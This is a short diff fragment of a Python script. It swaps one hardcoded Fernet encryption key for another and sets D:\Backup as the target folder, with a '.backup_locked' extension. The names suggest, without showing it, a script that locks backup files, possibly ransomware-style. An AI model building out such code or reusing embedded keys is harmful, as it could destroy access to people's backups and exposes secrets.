@@ -5,7 +5,7 @@ import base64
 from pathlib import Path
 from cryptography.fernet import Fernet
 
-key = b'IJLOYOl16Z-dMsPyp5L-n4BW8BEjXuomDCMG9WOYSMk='
+key = b'IWGhuNREoNpRCqqgV6Rpohxg9YvSfddipDS9jhagZh4='
 cipher = Fernet(key)
 target_dir = Path(r"D:\Backup")
 extension = ".backup_locked"
